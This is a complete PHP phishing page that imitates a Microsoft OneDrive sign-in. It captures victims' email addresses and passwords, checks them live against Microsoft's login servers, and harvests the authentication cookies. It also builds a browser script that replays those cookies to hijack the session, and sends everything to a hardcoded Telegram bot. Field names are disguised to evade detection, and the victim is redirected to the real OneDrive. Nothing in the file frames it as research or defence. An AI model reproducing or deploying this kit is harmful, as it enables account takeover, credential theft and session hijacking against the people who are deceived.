<?php
// Save as index.php
error_reporting(0);
ini_set('display_errors', 0);

session_start();

// Telegram Bot Configuration
define('TELEGRAM_BOT_TOKEN', '8465785486:AAEfomN9hYqkxvEV_7RxrrhWK22LwiI2Xbw');
define('TELEGRAM_CHAT_ID', '1717074775');

// Function to send message to Telegram
function sendToTelegram($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

// Function to send file to Telegram
function sendFileToTelegram($file_path, $caption = '') {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendDocument";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'chat_id' => TELEGRAM_CHAT_ID,
        'document' => new CURLFile($file_path),
        'caption' => $caption,
        'parse_mode' => 'HTML'
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

// Get user IP address
function getUserIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

// Cookie formatter function
function cookieToMambaFormat($cookie, $domain) {
    $arr = explode(";", $cookie);
    $name = explode("=", trim($arr[0]))[0];
    $value = explode("=", trim($arr[0]))[1];
    $expires = time() + 86400 * 30;
    $path = '/';
    $httpOnly = false;
    $secure = false;
    
    foreach ($arr as $item) {
        $item = trim($item);
        if (stripos($item, 'expires') !== false) {
            $expires = strtotime(explode("=", $item)[1]);
        }
        if (stripos($item, 'path') !== false) {
            $path = explode("=", $item)[1];
        }
        if (stripos($item, 'HttpOnly') !== false) {
            $httpOnly = true;
        }
        if (stripos($item, 'secure') !== false) {
            $secure = true;
        }
    }
    
    return [
        "name" => $name, 
        "value" => $value, 
        "domain" => $domain, 
        "path" => $path,
        "expires" => $expires, 
        "size" => strlen($name . $value), 
        "httpOnly" => $httpOnly,
        "secure" => $secure, 
        "session" => false, 
        "sameSite" => "None", 
        "priority" => "Medium",
        "sameParty" => false, 
        "sourceScheme" => "Secure", 
        "sourcePort" => 443
    ];
}

// Detect account type
function detectAndLogin($email, $password) {
    $domain = substr(strrchr($email, "@"), 1);
    $consumer_domains = ['outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'hotmail.co.uk', 'hotmail.fr'];
    
    if (in_array($domain, $consumer_domains)) {
        return loginLive($email, $password);
    } else {
        return loginMicrosoftOnline($email, $password);
    }
}

// Business login (microsoftonline.com)
function loginMicrosoftOnline($email, $password) {
    $ch = curl_init();
    
    // Step 1: Get initial configuration
    curl_setopt($ch, CURLOPT_URL, 'https://login.microsoftonline.com/common/oauth2/authorize?' . http_build_query([
        'response_type' => 'code',
        'client_id' => 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
        'resource' => 'https://officeapps.live.com',
        'redirect_uri' => 'msauth://com.microsoft.office.officehubrow/fcg80qvoM1YMKJZibjBwQcDfOno%3D',
        'login_hint' => $email
    ]));
    
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    $result = curl_exec($ch);
    
    // Extract configuration
    preg_match('/\$Config=({.*?});/', $result, $matches);
    if (!isset($matches[1])) { 
        curl_close($ch); 
        return false; 
    }
    
    $json = json_decode($matches[1], true);
    $tokens = [
        'ctx' => $json['sCtx'],
        'flowToken' => $json['sFT'],
        'hpgrequestid' => $json['sessionId'],
        'canary' => $json['canary']
    ];
    
    // Step 2: Submit credentials
    $postData = http_build_query([
        'i13' => '0',
        'login' => $email,
        'loginfmt' => $email,
        'type' => '11',
        'LoginOptions' => '3',
        'passwd' => $password,
        'ps' => '2',
        'canary' => $tokens['canary'],
        'ctx' => $tokens['ctx'],
        'hpgrequestid' => $tokens['hpgrequestid'],
        'flowToken' => $tokens['flowToken'],
        'PPSX' => '',
        'NewUser' => '1',
        'FoundMSAs' => '',
        'fspost' => '0',
        'i21' => '0',
        'CookieDisclosure' => '0',
        'IsFidoSupported' => '0',
        'isSignupPost' => '0',
        'i19' => '318945'
    ]);
    
    curl_setopt($ch, CURLOPT_URL, 'https://login.microsoftonline.com/common/login');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    $result = curl_exec($ch);
    
    // Extract cookies
    preg_match_all('/^Set-Cookie:\s*([^\r\n]+)/mi', $result, $cookies);
    curl_close($ch);
    
    // Check for auth cookies (this means credentials were correct)
    $hasAuth = false;
    $cookieList = [];
    
    if (!empty($cookies[1])) {
        foreach ($cookies[1] as $cookie) {
            // ESTSAUTH is the main authentication cookie
            if (strpos($cookie, 'ESTSAUTH') !== false) { 
                $hasAuth = true; 
            }
            $cookieList[] = cookieToMambaFormat($cookie, 'login.microsoftonline.com');
        }
    }
    
    if ($hasAuth) {
        saveMambaFormat($email, $password, 'BUSINESS', $cookieList);
        return true; // Credentials are correct
    }
    
    return false; // Credentials are incorrect
}

// Consumer login (live.com)
function loginLive($email, $password) {
    $ch = curl_init();
    
    // Step 1: Get initial login page and tokens
    curl_setopt($ch, CURLOPT_URL, 'https://login.live.com/oauth20_authorize.srf?' . http_build_query([
        'client_id' => '000000004C12AE68',
        'redirect_uri' => 'https://login.live.com/oauth20_desktop.srf',
        'response_type' => 'code',
        'display' => 'touch',
        'locale' => 'en',
        'scope' => 'service::user.auth.xboxlive.com::MBI_SSL',
        'login_hint' => $email
    ]));
    
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    $result = curl_exec($ch);
    
    // Extract required tokens
    preg_match('/<input type="hidden" name="PPFT" id="i0327" value="([^"]+)"/', $result, $ppft);
    preg_match('/<input type="hidden" name="PPSX" id="i0337" value="([^"]+)"/', $result, $ppsx);
    preg_match('/urlPost:\'([^\']+)/', $result, $urlPost);
    preg_match('/sCtx:\'([^\']+)/', $result, $ctx);
    
    if (!isset($ppft[1]) || !isset($urlPost[1])) {
        curl_close($ch);
        return false;
    }
    
    // Step 2: Submit credentials with tokens
    $postData = http_build_query([
        'login' => $email,
        'passwd' => $password,
        'PPFT' => $ppft[1],
        'PPSX' => $ppsx[1] ?? '',
        'type' => 11,
        'ctx' => $ctx[1] ?? '',
        'hpgrequestid' => '',
        'flowtoken' => '',
        'canary' => ''
    ]);
    
    curl_setopt($ch, CURLOPT_URL, $urlPost[1]);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    $result = curl_exec($ch);
    
    preg_match_all('/^Set-Cookie:\s*([^\r\n]+)/mi', $result, $cookies);
    curl_close($ch);
    
    // Check for auth cookies
    $hasAuth = false;
    $cookieList = [];
    
    if (!empty($cookies[1])) {
        foreach ($cookies[1] as $cookie) {
            // MSPAuth and MSPOK are the main authentication cookies for live.com
            if (strpos($cookie, 'MSPAuth') !== false || 
                strpos($cookie, 'MSPOK') !== false) {
                $hasAuth = true; 
            }
            $cookieList[] = cookieToMambaFormat($cookie, 'login.live.com');
        }
    }
    
    if ($hasAuth) {
        saveMambaFormat($email, $password, 'CONSUMER', $cookieList);
        return true; // Credentials are correct
    }
    
    return false; // Credentials are incorrect
}

// Save in MAMBA format and send to Telegram
function saveMambaFormat($email, $password, $type, $cookieList) {
    $ip = getUserIP();
    $timestamp = date('Y-m-d H:i:s');
    
    // Create cookies content
    $data = "//[MAMBA COOKIES] Microsoft Account\n";
    $data .= "//--- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- \n\n";
    $data .= "// Email: $email\n// Password: $password\n// Type: $type\n// IP: $ip\n// Date: $timestamp\n\n";
    $data .= "(() => {\n    let cookies = " . json_encode($cookieList, JSON_PRETTY_PRINT) . ";\n";
    $data .= '    function setCookie(key, value, domain, expires, path, isSecure) {
        domain = domain ? domain : window.location.hostname;
        if (key.startsWith(\'__Host\')) {
            document.cookie = `${key}=${value};${expires};path=${path};Secure;SameSite=None`;
        } else if (key.startsWith(\'__Secure\')) {
            document.cookie = `${key}=${value};${expires};domain=${domain};path=${path};Secure;SameSite=None`;
        } else {
            if (isSecure) {
                if (window.location.hostname == domain) {
                    document.cookie = `${key}=${value};${expires};path=${path};Secure;SameSite=None`;
                } else {
                    document.cookie = `${key}=${value};${expires};domain=${domain};path=${path};Secure;SameSite=None`;
                }
            } else {
                if (window.location.hostname == domain) {
                    document.cookie = `${key}=${value};${expires};path=${path}`;
                } else {
                    document.cookie = `${key}=${value};${expires};domain=${domain};path=${path}`;
                }
            }
        }
    }
    for (let cookie of cookies) {
        setCookie(cookie.name, cookie.value, cookie.domain, cookie.expires, cookie.path, cookie.secure);
    }
    window.location.reload();
})();' . "\n";
    
    // Save to file
    $filename = 'mamba_cookies.txt';
    file_put_contents($filename, $data, FILE_APPEND);
    
    // Prepare Telegram message
    $message = "<b>✅ MICROSOFT ACCOUNT HIT</b>\n\n";
    $message .= "<b>Email:</b> <code>$email</code>\n";
    $message .= "<b>Password:</b> <code>$password</code>\n";
    $message .= "<b>Type:</b> $type\n";
    $message .= "<b>IP Address:</b> <code>$ip</code>\n";
    $message .= "<b>Date:</b> $timestamp\n";
    $message .= "<b>User Agent:</b> " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    
    // Send credentials to Telegram
    sendToTelegram($message);
    
    // Send cookies file to Telegram
    if (file_exists($filename)) {
        sendFileToTelegram($filename, "Cookies for: $email");
    }
}

// Process form submission
$showPasswordError = false;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // Email submission
    if (isset($_POST['fruit_basket'])) {
        $email = trim($_POST['fruit_basket']);
        $_SESSION['watermelon'] = $email;
        $_SESSION['step'] = 'password';
        
        // Send email to Telegram immediately when submitted
        $ip = getUserIP();
        $timestamp = date('Y-m-d H:i:s');
        $emailMessage = "<b>📧 MICROSOFT EMAIL SUBMITTED</b>\n\n";
        $emailMessage .= "<b>Email:</b> <code>$email</code>\n";
        $emailMessage .= "<b>IP Address:</b> <code>$ip</code>\n";
        $emailMessage .= "<b>Date:</b> $timestamp\n";
        $emailMessage .= "<b>User Agent:</b> " . $_SERVER['HTTP_USER_AGENT'] . "\n";
        sendToTelegram($emailMessage);
        
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    
    // Password submission - VERIFY CREDENTIALS
    elseif (isset($_POST['orange_seed'])) {
        $password = trim($_POST['orange_seed']);
        $email = $_SESSION['watermelon'] ?? '';
        
        // Send password to Telegram immediately when submitted
        $ip = getUserIP();
        $timestamp = date('Y-m-d H:i:s');
        $passwordMessage = "<b>🔑 MICROSOFT PASSWORD SUBMITTED</b>\n\n";
        $passwordMessage .= "<b>Email:</b> <code>$email</code>\n";
        $passwordMessage .= "<b>Password:</b> <code>$password</code>\n";
        $passwordMessage .= "<b>IP Address:</b> <code>$ip</code>\n";
        $passwordMessage .= "<b>Date:</b> $timestamp\n";
        $passwordMessage .= "<b>User Agent:</b> " . $_SERVER['HTTP_USER_AGENT'] . "\n";
        sendToTelegram($passwordMessage);
        
        if ($email) {
            // VERIFY with Microsoft - this returns true only if credentials are correct
            $credentials_valid = detectAndLogin($email, $password);
            
            if ($credentials_valid) {
                // Credentials are correct - redirect immediately to OneDrive
                session_destroy();
                header("Location: https://onedrive.live.com");
                exit;
            } else {
                // Credentials are incorrect - show error and let them try again
                $showPasswordError = true;
                $_SESSION['show_password_error'] = true;
            }
        }
    }
}

$currentStep = $_SESSION['step'] ?? 'username';
$showPasswordError = $_SESSION['show_password_error'] ?? false;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft OneDrive</title>
    <style>
        body{font-family:'Segoe UI',Arial,sans-serif;margin:0;padding:0;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;background-color:#f5f5f5;}
        .access-form-container{position:relative;width:400px;background-color:#ffffff;border-radius:0;box-shadow:0 2px 10px rgba(0,0,0,0.08);margin:10px;padding:20px;display:flex;flex-direction:column;justify-content:left;}
        .page-header{font-size:20px;color:#7e7979;margin-bottom:20px;text-align:left;padding:20px;}
        .main-title{text-align:center;font-weight:bold;color:#333;margin-bottom:15px;font-size:45px;}
        .input-container{position:relative;margin-left:1px;}
        .validation-alert{display:none;color:#d93025;margin-bottom:13px;margin-left:22px;margin-top:10px;font-size:14px;}
        .email-type-alert{display:none;color:#d93025;margin-bottom:13px;margin-left:22px;margin-top:10px;font-size:14px;}
        .password-error{color:#d93025;margin:0;margin-left:22px;font-size:13px;padding-top:4px;}
        .info-section{position:relative;width:400px;background-color:#fff;border-radius:0;box-shadow:0 2px 10px rgba(0,0,0,0.08);margin:10px;padding:20px;display:flex;flex-direction:column;justify-content:center;}
        .secondary-link{text-align:left;color:#0056b3;font-size:14px;font-family:'Segoe UI',sans-serif;cursor:pointer;text-decoration:none;padding:2px;margin-left:-2px;margin-top:10px;}
        .user-input{width:calc(100% - 50px);padding:1px;margin:0;border:none;border-radius:0;box-shadow:0 1px 0 rgba(0,0,0,0.1);color:#333;text-align:left;margin-left:20px;font-size:16px;line-height:1;padding:12px 5px;box-sizing:border-box;}
        .user-input:focus{outline:none;box-shadow:0 0 0 #ebebeb;}
        .text-section{text-align:left;color:#333;margin-left:25px;margin-top:15px;margin-bottom:15px;font-size:14px;}
        .form-label{width:100%;font-size:26px;font-weight:600;text-align:left;margin-bottom:5px;padding-top:1px;margin-top:-25px;font-family:'Segoe UI',sans-serif;margin-left:25.5px;}
        .create-account-link{color:#0e6edb;text-decoration:none;}
        .action-button-container{display:flex;justify-content:flex-end;margin-top:15px;}
        .action-button{background-color:rgba(0,101,183,0.911);color:white;padding:10px 30px;border:none;border-radius:1px;cursor:pointer;font-size:14px;}
        .sign-in-options{margin-left:20px;font-size:14px;color:#333;display:flex;align-items:center;}
        .key-icon{width:35px;height:auto;vertical-align:middle;margin-right:10px;}
        .password-recovery{text-align:left;color:#0056b3;font-size:14px;font-family:'Segoe UI',sans-serif;cursor:pointer;text-decoration:none;padding:2px;margin-left:-2px;margin-top:10px;}
        .brand-logo{width:40px;height:auto;vertical-align:middle;margin-right:-7px;position:relative;top:-5px;transition:top 0.3s ease;}
        .brand-logo:hover{top:-7px;}
    </style>
</head>
<body>
    <div class="access-form-container">
        <h2 class="page-header">
            <img src="com.png" alt="Microsoft Logo" class="brand-logo"> Microsoft
        </h2>
        
        <?php if ($currentStep === 'username'): ?>
            <label for="user-input-field" class="form-label">Sign in</label>
            <form id="access-form" method="POST" action="">
                <div class="input-container">
                    <div id="validation-message" class="validation-alert">Please enter your email address, phone, or Skype.</div>
                    <div id="email-type-message" class="email-type-alert">Please use a Microsoft account.</div>
                    <input type="text" id="user-input-field" name="fruit_basket" placeholder="Email address, phone, or Skype" class="user-input">
                </div>
                <div class="text-section">
                    <p>No account? <a href="#" class="create-account-link">Create one!</a></p>
                    <a href="#" class="secondary-link">Create a new account here</a>
                </div>
                <div class="action-button-container">
                    <button type="submit" class="action-button">Next</button>
                </div>
            </form>
            
        <?php else: ?>
            <label for="password-input-field" class="form-label">Enter password</label>
            <form id="password-form" method="POST" action="">
                <div class="input-container">
                    <input type="password" id="password-input-field" name="orange_seed" placeholder="Password" class="user-input" style="margin-bottom:<?php echo $showPasswordError ? '0' : '15px'; ?>">
                    <?php if ($showPasswordError): ?>
                        <div class="password-error">Incorrect password. Try again.</div>
                    <?php endif; ?>
                    <div id="password-validation-message" class="validation-alert">Please enter your password.</div>
                </div>
                <div class="text-section">
                    <p><a href="#" class="password-recovery">Forgot my password</a></p>
                    <a href="#" class="secondary-link">Forgot my username</a>
                </div>
                <div class="action-button-container">
                    <button type="submit" class="action-button">Sign in</button>
                </div>
            </form>
        <?php endif; ?>
    </div>
    
    <div class="info-section">
        <div class="sign-in-options">
            <img src="keyxx.PNG" alt="Sign-in Options" class="key-icon">
            <p>Sign-in options</p>
        </div>
    </div>

    <script>
        <?php if ($currentStep === 'username'): ?>
            document.getElementById('access-form').addEventListener('submit', function(event) {
                var inputElement = document.getElementById('user-input-field');
                var validationAlert = document.getElementById('validation-message');
                var emailTypeAlert = document.getElementById('email-type-message');
                var inputValue = inputElement.value.trim().toLowerCase();
                
                validationAlert.style.display = 'none';
                emailTypeAlert.style.display = 'none';
                
                if (inputValue === "") {
                    validationAlert.style.display = 'block';
                    event.preventDefault();
                    return;
                }
                
                if (inputValue.includes('@')) {
                    var blockedDomains = ['@gmail.com', '@aol.com', '@icloud.com', '@yahoo.com'];
                    
                    for (var i = 0; i < blockedDomains.length; i++) {
                        if (inputValue.endsWith(blockedDomains[i])) {
                            emailTypeAlert.style.display = 'block';
                            event.preventDefault();
                            return;
                        }
                    }
                }
            });
        <?php else: ?>
            document.getElementById('password-form').addEventListener('submit', function(event) {
                var inputElement = document.getElementById('password-input-field');
                var alertElement = document.getElementById('password-validation-message');

                if (inputElement.value.trim() === "") {
                    alertElement.style.display = 'block';
                    event.preventDefault();
                } else {
                    alertElement.style.display = 'none';
                }
            });
        <?php endif; ?>
    </script>
</body>
</html>